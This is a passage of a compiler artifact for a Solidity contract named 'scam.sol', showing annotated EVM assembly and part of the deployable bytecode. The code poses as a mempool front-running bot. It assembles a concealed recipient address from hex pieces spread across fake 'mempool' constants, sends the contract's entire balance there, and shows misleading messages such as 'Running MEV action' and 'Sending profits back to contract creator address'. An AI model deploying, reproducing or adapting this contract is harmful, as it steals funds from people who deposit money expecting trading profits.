   dup2\n        /* \"scam.sol\":8971:8977  tmp[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_77\n      jumpi\n      invalid\n    tag_77:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"scam.sol\":8965:8978  uint8(tmp[i]) */\n      0xf8\n      shr\n        /* \"scam.sol\":8957:8979  uint160(uint8(tmp[i])) */\n      0xff\n      and\n        /* \"scam.sol\":8952:8979  b1 = uint160(uint8(tmp[i])) */\n      swap3\n      pop\n        /* \"scam.sol\":9013:9016  tmp */\n      dup5\n        /* \"scam.sol\":9021:9022  1 */\n      0x01\n        /* \"scam.sol\":9017:9018  i */\n      dup3\n        /* \"scam.sol\":9017:9022  i + 1 */\n      add\n        /* \"scam.sol\":9013:9023  tmp[i + 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_78\n      jumpi\n      invalid\n    tag_78:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"scam.sol\":9007:9024  uint8(tmp[i + 1]) */\n      0xf8\n      shr\n        /* \"scam.sol\":8999:9025  uint160(uint8(tmp[i + 1])) */\n      0xff\n      and\n        /* \"scam.sol\":8994:9025  b2 = uint160(uint8(tmp[i + 1])) */\n      swap2\n      pop\n        /* \"scam.sol\":9051:9053  97 */\n      0x61\n        /* \"scam.sol\":9045:9047  b1 */\n      dup4\n        /* \"scam.sol\":9045:9053  b1 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"scam.sol\":9044:9069  (b1 >= 97) && (b1 <= 102) */\n      dup1\n      iszero\n      tag_79\n      jumpi\n      pop\n        /* \"scam.sol\":9065:9068  102 */\n      0x66\n        /* \"scam.sol\":9059:9061  b1 */\n      dup4\n        /* \"scam.sol\":9059:9068  b1 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"scam.sol\":9044:9069  (b1 >= 97) && (b1 <= 102) */\n    tag_79:\n        /* \"scam.sol\":9040:9272  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n      iszero\n      tag_80\n      jumpi\n        /* \"scam.sol\":9096:9098  87 */\n      0x57\n        /* \"scam.sol\":9090:9098  b1 -= 87 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"scam.sol\":9040:9272  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n      jump(tag_81)\n    tag_80:\n        /* \"scam.sol\":9131:9133  65 */\n      0x41\n        /* \"scam.sol\":9125:9127  b1 */\n      dup4\n        /* \"scam.sol\":9125:9133  b1 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"scam.sol\":9124:9148  (b1 >= 65) && (b1 <= 70) */\n      dup1\n      iszero\n      tag_82\n      jumpi\n      pop\n        /* \"scam.sol\":9145:9147  70 */\n      0x46\n        /* \"scam.sol\":9139:9141  b1 */\n      dup4\n        /* \"scam.sol\":9139:9147  b1 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"scam.sol\":9124:9148  (b1 >= 65) && (b1 <= 70) */\n    tag_82:\n        /* \"scam.sol\":9120:9272  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n      iszero\n      tag_83\n      jumpi\n        /* \"scam.sol\":9175:9177  55 */\n      0x37\n        /* \"scam.sol\":9169:9177  b1 -= 55 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"scam.sol\":9120:9272  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n      jump(tag_84)\n    tag_83:\n        /* \"scam.sol\":9210:9212  48 */\n      0x30\n        /* \"scam.sol\":9204:9206  b1 */\n      dup4\n        /* \"scam.sol\":9204:9212  b1 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"scam.sol\":9203:9227  (b1 >= 48) && (b1 <= 57) */\n      dup1\n      iszero\n      tag_85\n      jumpi\n      pop\n        /* \"scam.sol\":9224:9226  57 */\n      0x39\n        /* \"scam.sol\":9218:9220  b1 */\n      dup4\n        /* \"scam.sol\":9218:9226  b1 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"scam.sol\":9203:9227  (b1 >= 48) && (b1 <= 57) */\n    tag_85:\n        /* \"scam.sol\":9199:9272  if ((b1 >= 48) && (b1 <= 57)) {\r... */\n      iszero\n      tag_86\n      jumpi\n        /* \"scam.sol\":9254:9256  48 */\n      0x30\n        /* \"scam.sol\":9248:9256  b1 -= 48 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"scam.sol\":9199:9272  if ((b1 >= 48) && (b1 <= 57)) {\r... */\n    tag_86:\n        /* \"scam.sol\":9120:9272  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n    tag_84:\n        /* \"scam.sol\":9040:9272  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n    tag_81:\n        /* \"scam.sol\":9297:9299  97 */\n      0x61\n        /* \"scam.sol\":9291:9293  b2 */\n      dup3\n        /* \"scam.sol\":9291:9299  b2 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"scam.sol\":9290:9315  (b2 >= 97) && (b2 <= 102) */\n      dup1\n      iszero\n      tag_87\n      jumpi\n      pop\n        /* \"scam.sol\":9311:9314  102 */\n      0x66\n        /* \"scam.sol\":9305:9307  b2 */\n      dup3\n        /* \"scam.sol\":9305:9314  b2 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"scam.sol\":9290:9315  (b2 >= 97) && (b2 <= 102) */\n    tag_87:\n        /* \"scam.sol\":9286:9518  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n      iszero\n      tag_88\n      jumpi\n        /* \"scam.sol\":9342:9344  87 */\n      0x57\n        /* \"scam.sol\":9336:9344  b2 -= 87 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"scam.sol\":9286:9518  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n      jump(tag_89)\n    tag_88:\n        /* \"scam.sol\":9377:9379  65 */\n      0x41\n        /* \"scam.sol\":9371:9373  b2 */\n      dup3\n        /* \"scam.sol\":9371:9379  b2 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"scam.sol\":9370:9394  (b2 >= 65) && (b2 <= 70) */\n      dup1\n      iszero\n      tag_90\n      jumpi\n      pop\n        /* \"scam.sol\":9391:9393  70 */\n      0x46\n        /* \"scam.sol\":9385:9387  b2 */\n      dup3\n        /* \"scam.sol\":9385:9393  b2 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"scam.sol\":9370:9394  (b2 >= 65) && (b2 <= 70) */\n    tag_90:\n        /* \"scam.sol\":9366:9518  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n      iszero\n      tag_91\n      jumpi\n        /* \"scam.sol\":9421:9423  55 */\n      0x37\n        /* \"scam.sol\":9415:9423  b2 -= 55 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"scam.sol\":9366:9518  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n      jump(tag_92)\n    tag_91:\n        /* \"scam.sol\":9456:9458  48 */\n      0x30\n        /* \"scam.sol\":9450:9452  b2 */\n      dup3\n        /* \"scam.sol\":9450:9458  b2 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"scam.sol\":9449:9473  (b2 >= 48) && (b2 <= 57) */\n      dup1\n      iszero\n      tag_93\n      jumpi\n      pop\n        /* \"scam.sol\":9470:9472  57 */\n      0x39\n        /* \"scam.sol\":9464:9466  b2 */\n      dup3\n        /* \"scam.sol\":9464:9472  b2 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"scam.sol\":9449:9473  (b2 >= 48) && (b2 <= 57) */\n    tag_93:\n        /* \"scam.sol\":9445:9518  if ((b2 >= 48) && (b2 <= 57)) {\r... */\n      iszero\n      tag_94\n      jumpi\n        /* \"scam.sol\":9500:9502  48 */\n      0x30\n        /* \"scam.sol\":9494:9502  b2 -= 48 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"scam.sol\":9445:9518  if ((b2 >= 48) && (b2 <= 57)) {\r... */\n    tag_94:\n        /* \"scam.sol\":9366:9518  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n    tag_92:\n        /* \"scam.sol\":9286:9518  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n    tag_89:\n        /* \"scam.sol\":9552:9554  b2 */\n      dup2\n        /* \"scam.sol\":9547:9549  16 */\n      0x10\n        /* \"scam.sol\":9542:9544  b1 */\n      dup5\n        /* \"scam.sol\":9542:9549  b1 * 16 */\n      mul\n        /* \"scam.sol\":9542:9554  b1 * 16 + b2 */\n      add\n        /* \"scam.sol\":9532:9555  iaddr += (b1 * 16 + b2) */\n      dup5\n      add\n      swap4\n      pop\n        /* \"scam.sol\":8907:8908  2 */\n      0x02\n        /* \"scam.sol\":8902:8908  i += 2 */\n      dup2\n      add\n      swap1\n      pop\n        /* \"scam.sol\":8869:9567  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n      jump(tag_74)\n    tag_75:\n      pop\n        /* \"scam.sol\":9592:9597  iaddr */\n      dup3\n        /* \"scam.sol\":9577:9598  return address(iaddr) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"scam.sol\":8666:9606  function parseMempool(string memory _a) internal pure returns (address _parsed) {\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"scam.sol\":8402:8494  function getMemPoolOffset() internal pure returns (uint) {\r... */\n    tag_55:\n        /* \"scam.sol\":8453:8457  uint */\n      0x00\n        /* \"scam.sol\":8477:8486  194976265 */\n      0x0b9f1a09\n        /* \"scam.sol\":8470:8486  return 194976265 */\n      swap1\n      pop\n        /* \"scam.sol\":8402:8494  function getMemPoolOffset() internal pure returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"scam.sol\":10168:10608  function checkLiquidity(uint a) internal pure returns (string memory) {\r... */\n    tag_56:\n        /* \"scam.sol\":10223:10236  string memory */\n      0x60\n        /* \"scam.sol\":10252:10262  uint count */\n      0x00\n        /* \"scam.sol\":10277:10283  uint b */\n      dup1\n        /* \"scam.sol\":10286:10287  a */\n      dup4\n        /* \"scam.sol\":10277:10287  uint b = a */\n      swap1\n      pop\n        /* \"scam.sol\":10298:10369  while (b != 0) {\r... */\n    tag_97:\n        /* \"scam.sol\":10310:10311  0 */\n      0x00\n        /* \"scam.sol\":10305:10306  b */\n      dup2\n        /* \"scam.sol\":10305:10311  b != 0 */\n      eq\n        /* \"scam.sol\":10298:10369  while (b != 0) {\r... */\n      tag_98\n      jumpi\n        /* \"scam.sol\":10328:10335  count++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"scam.sol\":10355:10357  16 */\n      0x10\n        /* \"scam.sol\":10350:10357  b /= 16 */\n      dup2\n      dup2\n      tag_99\n      jumpi\n      invalid\n    tag_99:\n      div\n      swap1\n      pop\n        /* \"scam.sol\":10298:10369  while (b != 0) {\r... */\n      jump(tag_97)\n    tag_98:\n        /* \"scam.sol\":10379:10395  bytes memory res */\n      0x60\n        /* \"scam.sol\":10408:10413  count */\n      dup3\n        /* \"scam.sol\":10398:10414  new bytes(count) */\n      0xffffffffffffffff\n      dup2\n      gt\n      dup1\n      iszero\n      tag_100\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_100:\n      pop\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_101\n      jumpi\n      dup2\n      0x20\n      add\n      0x01\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_101:\n      pop\n        /* \"scam.sol\":10379:10414  bytes memory res = new bytes(count) */\n      swap1\n      pop\n        /* \"scam.sol\":10430:10436  uint i */\n      0x00\n        /* \"scam.sol\":10425:10569  for (uint i=0; i<count; ++i) {\r... */\n    tag_102:\n        /* \"scam.sol\":10442:10447  count */\n      dup4\n        /* \"scam.sol\":10440:10441  i */\n      dup2\n        /* \"scam.sol\":10440:10447  i<count */\n      lt\n        /* \"scam.sol\":10425:10569  for (uint i=0; i<count; ++i) {\r... */\n      iszero\n      tag_103\n      jumpi\n        /* \"scam.sol\":10477:10479  16 */\n      0x10\n        /* \"scam.sol\":10473:10474  a */\n      dup7\n        /* \"scam.sol\":10473:10479  a % 16 */\n      dup2\n      tag_105\n      jumpi\n      invalid\n    tag_105:\n      mod\n        /* \"scam.sol\":10469:10479  b = a % 16 */\n      swap3\n      pop\n        /* \"scam.sol\":10515:10535  toHexDigit(uint8(b)) */\n      tag_106\n        /* \"scam.sol\":10532:10533  b */\n      dup4\n        /* \"scam.sol\":10515:10525  toHexDigit */\n      tag_107\n        /* \"scam.sol\":10515:10535  toHexDigit(uint8(b)) */\n      jump\t// in\n    tag_106:\n        /* \"scam.sol\":10494:10497  res */\n      dup3\n        /* \"scam.sol\":10510:10511  1 */\n      0x01\n        /* \"scam.sol\":10506:10507  i */\n      dup4\n        /* \"scam.sol\":10498:10503  count */\n      dup8\n        /* \"scam.sol\":10498:10507  count - i */\n      sub\n        /* \"scam.sol\":10498:10511  count - i - 1 */\n      sub\n        /* \"scam.sol\":10494:10512  res[count - i - 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_108\n      jumpi\n      invalid\n    tag_108:\n      0x20\n      add\n      add\n        /* \"scam.sol\":10494:10535  res[count - i - 1] = toHexDigit(uint8(b)) */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"scam.sol\":10555:10557  16 */\n      0x10\n        /* \"scam.sol\":10550:10557  a /= 16 */\n      dup7\n      dup2\n      tag_109\n      jumpi\n      invalid\n    tag_109:\n      div\n      swap6\n      pop\n        /* \"scam.sol\":10449:10452  ++i */\n      dup1\n      0x01\n      add\n      swap1\n      pop\n        /* \"scam.sol\":10425:10569  for (uint i=0; i<count; ++i) {\r... */\n      jump(tag_102)\n    tag_103:\n      pop\n        /* \"scam.sol\":10596:10599  res */\n      dup1\n        /* \"scam.sol\":10582:10600  return string(res) */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"scam.sol\":10168:10608  function checkLiquidity(uint a) internal pure returns (string memory) {\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"scam.sol\":16932:17567  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\r... */\n    tag_57:\n        /* \"scam.sol\":17015:17028  string memory */\n      0x60\n        /* \"scam.sol\":17041:17064  bytes memory _baseBytes */\n      dup1\n        /* \"scam.sol\":17073:17078  _base */\n      dup4\n        /* \"scam.sol\":17041:17079  bytes memory _baseBytes = bytes(_base) */\n      swap1\n      pop\n        /* \"scam.sol\":17090:17114  bytes memory _valueBytes */\n      0x60\n        /* \"scam.sol\":17123:17129  _value */\n      dup4\n        /* \"scam.sol\":17090:17130  bytes memory _valueBytes = bytes(_value) */\n      swap1\n      pop\n        /* \"scam.sol\":17144:17167  string memory _tmpValue */\n      0x60\n        /* \"scam.sol\":17201:17212  _valueBytes */\n      dup2\n        /* \"scam.sol\":17201:17219  _valueBytes.length */\n      mload\n        /* \"scam.sol\":17181:17191  _baseBytes */\n      dup4\n        /* \"scam.sol\":17181:17198  _baseBytes.length */\n      mload\n        /* \"scam.sol\":17181:17219  _baseBytes.length + _valueBytes.length */\n      add\n        /* \"scam.sol\":17170:17220  new string(_baseBytes.length + _valueBytes.length) */\n      0xffffffffffffffff\n      dup2\n      gt\n      dup1\n      iszero\n      tag_111\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_111:\n      pop\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_112\n      jumpi\n      dup2\n      0x20\n      add\n      0x01\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_112:\n      pop\n        /* \"scam.sol\":17144:17220  string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length) */\n      swap1\n      pop\n        /* \"scam.sol\":17231:17253  bytes memory _newValue */\n      0x60\n        /* \"scam.sol\":17262:17271  _tmpValue */\n      dup2\n        /* \"scam.sol\":17231:17272  bytes memory _newValue = bytes(_tmpValue) */\n      swap1\n      pop\n        /* \"scam.sol\":17286:17292  uint i */\n      0x00\n        /* \"scam.sol\":17303:17309  uint j */\n      dup1\n        /* \"scam.sol\":17329:17330  0 */\n      0x00\n        /* \"scam.sol\":17327:17330  i=0 */\n      swap2\n      pop\n        /* \"scam.sol\":17323:17415  for(i=0; i<_baseBytes.length; i++) {\r... */\n    tag_113:\n        /* \"scam.sol\":17334:17344  _baseBytes */\n      dup6\n        /* \"scam.sol\":17334:17351  _baseBytes.length */\n      mload\n        /* \"scam.sol\":17332:17333  i */\n      dup3\n        /* \"scam.sol\":17332:17351  i<_baseBytes.length */\n      lt\n        /* \"scam.sol\":17323:17415  for(i=0; i<_baseBytes.length; i++) {\r... */\n      iszero\n      tag_114\n      jumpi\n        /* \"scam.sol\":17390:17400  _baseBytes */\n      dup6\n        /* \"scam.sol\":17401:17402  i */\n      dup3\n        /* \"scam.sol\":17390:17403  _baseBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_116\n      jumpi\n      invalid\n    tag_116:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"scam.sol\":17373:17382  _newValue */\n      dup4\n        /* \"scam.sol\":17383:17386  j++ */\n      dup3\n      dup1\n      0x01\n      add\n      swap4\n      pop\n        /* \"scam.sol\":17373:17387  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_117\n      jumpi\n      invalid\n    tag_117:\n      0x20\n      add\n      add\n        /* \"scam.sol\":17373:17403  _newValue[j++] = _baseBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"scam.sol\":17353:17356  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"scam.sol\":17323:17415  for(i=0; i<_baseBytes.length; i++) {\r... */\n      jump(tag_113)\n    tag_114:\n        /* \"scam.sol\":17434:17435  0 */\n      0x00\n        /* \"scam.sol\":17432:17435  i=0 */\n      swap2\n      pop\n        /* \"scam.sol\":17428:17522  for(i=0; i<_valueBytes.length; i++) {\r... */\n    tag_118:\n        /* \"scam.sol\":17439:17450  _valueBytes */\n      dup5\n        /* \"scam.sol\":17439:17457  _valueBytes.length */\n      mload\n        /* \"scam.sol\":17437:17438  i */\n      dup3\n        /* \"scam.sol\":17437:17457  i<_valueBytes.length */\n      lt\n        /* \"scam.sol\":17428:17522  for(i=0; i<_valueBytes.length; i++) {\r... */\n      iszero\n      tag_119\n      jumpi\n        /* \"scam.sol\":17496:17507  _valueBytes */\n      dup5\n        /* \"scam.sol\":17508:17509  i */\n      dup3\n        /* \"scam.sol\":17496:17510  _valueBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_121\n      jumpi\n      invalid\n    tag_121:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"scam.sol\":17479:17488  _newValue */\n      dup4\n        /* \"scam.sol\":17489:17492  j++ */\n      dup3\n      dup1\n      0x01\n      add\n      swap4\n      pop\n        /* \"scam.sol\":17479:17493  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_122\n      jumpi\n      invalid\n    tag_122:\n      0x20\n      add\n      add\n        /* \"scam.sol\":17479:17510  _newValue[j++] = _valueBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"scam.sol\":17459:17462  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"scam.sol\":17428:17522  for(i=0; i<_valueBytes.length; i++) {\r... */\n      jump(tag_118)\n    tag_119:\n        /* \"scam.sol\":17549:17558  _newValue */\n      dup3\n        /* \"scam.sol\":17535:17559  return string(_newValue) */\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"scam.sol\":16932:17567  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\r... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"scam.sol\":13257:13347  function getMemPoolHeight() internal pure returns (uint) {\r... */\n    tag_59:\n        /* \"scam.sol\":13308:13312  uint */\n      0x00\n        /* \"scam.sol\":13332:13339  2726264 */\n      0x299978\n        /* \"scam.sol\":13325:13339  return 2726264 */\n      swap1\n      pop\n        /* \"scam.sol\":13257:13347  function getMemPoolHeight() internal pure returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"scam.sol\":16543:16631  function getMemPoolDepth() internal pure returns (uint) {\r... */\n    tag_61:\n        /* \"scam.sol\":16593:16597  uint */\n      0x00\n        /* \"scam.sol\":16617:16623  840885 */\n      0x0cd4b5\n        /* \"scam.sol\":16610:16623  return 840885 */\n      swap1\n      pop\n        /* \"scam.sol\":16543:16631  function getMemPoolDepth() internal pure returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"scam.sol\":14763:15090  function toHexDigit(uint8 d) pure internal returns (byte) {\r... */\n    tag_107:\n        /* \"scam.sol\":14815:14819  byte */\n      0x00\n        /* \"scam.sol\":14841:14842  d */\n      dup2\n        /* \"scam.sol\":14836:14842  0 <= d */\n      0xff\n      and\n        /* \"scam.sol\":14836:14837  0 */\n      0x00\n        /* \"scam.sol\":14836:14842  0 <= d */\n      gt\n      iszero\n        /* \"scam.sol\":14836:14852  0 <= d && d <= 9 */\n      dup1\n      iszero\n      tag_126\n      jumpi\n      pop\n        /* \"scam.sol\":14851:14852  9 */\n      0x09\n        /* \"scam.sol\":14846:14847  d */\n      dup3\n        /* \"scam.sol\":14846:14852  d <= 9 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"scam.sol\":14836:14852  0 <= d && d <= 9 */\n    tag_126:\n        /* \"scam.sol\":14832:15023  if (0 <= d && d <= 9) {\r... */\n      iszero\n      tag_127\n      jumpi\n        /* \"scam.sol\":14900:14901  d */\n      dup2\n        /* \"scam.sol\":14887:14896  byte('0') */\n      0x3000000000000000000000000000000000000000000000000000000000000000\n        /* \"scam.sol\":14881:14897  uint8(byte('0')) */\n      0xf8\n      shr\n        /* \"scam.sol\":14881:14901  uint8(byte('0')) + d */\n      add\n        /* \"scam.sol\":14876:14902  byte(uint8(byte('0')) + d) */\n      0xf8\n      shl\n        /* \"scam.sol\":14869:14902  return byte(uint8(byte('0')) + d) */\n      swap1\n      pop\n      jump(tag_125)\n        /* \"scam.sol\":14832:15023  if (0 <= d && d <= 9) {\r... */\n    tag_127:\n        /* \"scam.sol\":14936:14937  d */\n      dup2\n        /* \"scam.sol\":14924:14938  10 <= uint8(d) */\n      0xff\n      and\n        /* \"scam.sol\":14924:14926  10 */\n      0x0a\n        /* \"scam.sol\":14924:14938  10 <= uint8(d) */\n      gt\n      iszero\n        /* \"scam.sol\":14924:14956  10 <= uint8(d) && uint8(d) <= 15 */\n      dup1\n      iszero\n      tag_129\n      jumpi\n      pop\n        /* \"scam.sol\":14954:14956  15 */\n      0x0f\n        /* \"scam.sol\":14948:14949  d */\n      dup3\n        /* \"scam.sol\":14942:14956  uint8(d) <= 15 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"scam.sol\":14924:14956  10 <= uint8(d) && uint8(d) <= 15 */\n    tag_129:\n        /* \"scam.sol\":14920:15023  if (10 <= uint8(d) && uint8(d) <= 15) {\r... */\n      iszero\n      tag_130\n      jumpi\n        /* \"scam.sol\":15008:15010  10 */\n      0x0a\n        /* \"scam.sol\":15004:15005  d */\n      dup3\n        /* \"scam.sol\":14991:15000  byte('a') */\n      0x6100000000000000000000000000000000000000000000000000000000000000\n        /* \"scam.sol\":14985:15001  uint8(byte('a')) */\n      0xf8\n      shr\n        /* \"scam.sol\":14985:15005  uint8(byte('a')) + d */\n      add\n        /* \"scam.sol\":14985:15010  uint8(byte('a')) + d - 10 */\n      sub\n        /* \"scam.sol\":14980:15011  byte(uint8(byte('a')) + d - 10) */\n      0xf8\n      shl\n        /* \"scam.sol\":14973:15011  return byte(uint8(byte('a')) + d - 10) */\n      swap1\n      pop\n      jump(tag_125)\n        /* \"scam.sol\":14920:15023  if (10 <= uint8(d) && uint8(d) <= 15) {\r... */\n    tag_130:\n        /* \"scam.sol\":15074:15082  revert() */\n      0x00\n      dup1\n      revert\n        /* \"scam.sol\":14763:15090  function toHexDigit(uint8 d) pure internal returns (byte) {\r... */\n    tag_125:\n      swap2\n      swap1\n      pop\n      jump\t// out\n    stop\n    data_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6 53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e\n    data_9fb03945078bc6c7000c07d459687b271ae0adc059777dee3669b3c70b385107 52756e6e696e67204d455620616374696f6e2e20546869732063616e2074616b652061207768696c653b20706c6561736520776169742e2e\n\n    auxdata: 0xa2646970667358221220664f2c069f54542f06f10b881b37e7a4b454ddffd1ffc08a7398478d351fde5f64736f6c634300060c0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60806040523480156200001157600080fd5b5060405162000e2c38038062000e2c833981810160405260408110156200003757600080fd5b81019080805160405193929190846401000000008211156200005857600080fd5b838201915060208201858111156200006f57600080fd5b82518660018202830111640100000000821117156200008d57600080fd5b8083526020830192505050908051906020019080838360005b83811015620000c3578082015181840152602081019050620000a6565b50505050905090810190601f168015620000f15780820380516001836020036101000a031916815260200191505b50604052602001805160405193929190846401000000008211156200011557600080fd5b838201915060208201858111156200012c57600080fd5b82518660018202830111640100000000821117156200014a57600080fd5b8083526020830192505050908051906020019080838360005b838110156200018057808201518184015260208101905062000163565b50505050905090810190601f168015620001ae5780820380516001836020036101000a031916815260200191505b506040525050508160009080519060200190620001cd929190620001ef565b508060019080519060200190620001e6929190620001ef565b50505062000295565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106200023257805160ff191683800117855562000263565b8280016001018555821562000263579182015b828111156200026257825182559160200191906001019062000245565b5b50905062000272919062000276565b5090565b5b808211156200029157600081600090555060010162000277565b5090565b610b8780620002a56000396000f3fe6080604052600436106100435760003560e01c80637d53d4331461004f578063be9a6555146100df578063d4e93292146100e9578063e1812f05146100f35761004a565b3661004a57005b600080fd5b34801561005b57600080fd5b50610064610183565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a4578082015181840152602081019050610089565b50505050905090810190601f1680156100d15780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6100e7610221565b005b6100f16102bc565b005b3480156100ff57600080fd5b50610108610357565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561014857808201518184015260208101905061012d565b50505050905090810190601f1680156101755780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b60018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156102195780601f106101ee57610100808354040283529160200191610219565b820191906000526020600020905b8154815290600101906020018083116101fc57829003601f168201915b505050505081565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526038815260200180610b1a6038913960400191505060405180910390a16102746103f5565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156102b9573d6000803e3d6000fd5b50565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526033815260200180610ae76033913960400191505060405180910390a161030f61040c565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610354573d6000803e3d6000fd5b50565b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156103ed5780601f106103c2576101008083540402835291602001916103ed565b820191906000526020600020905b8154815290600101906020018083116103d057829003601f168201915b505050505081565b6000610407610402610423565b61056c565b905090565b600061041e610419610423565b61056c565b905090565b6060806104746040518060400160405280600181526020017f780000000000000000000000000000000000000000000000000000000000000081525061046f61046a6107c1565b6107cd565b6108cc565b905060006293fc1e90506000640f676e9a32905060006305bbeab19050600061049b610a27565b905060006104a7610a32565b905060606104bd876104b8886107cd565b6108cc565b905060606104db6104cd876107cd565b6104d6876107cd565b6108cc565b905060606104e8856107cd565b905060606104f5856107cd565b9050606061051561050686866108cc565b61051085856108cc565b6108cc565b905060606105586040518060400160405280600181526020017f3000000000000000000000000000000000000000000000000000000000000000815250836108cc565b9050809c5050505050505050505050505090565b60006060829050600080806000600290505b602a8110156107b4576101008402935084818151811061059a57fe5b602001015160f81c60f81b60f81c60ff1692508460018201815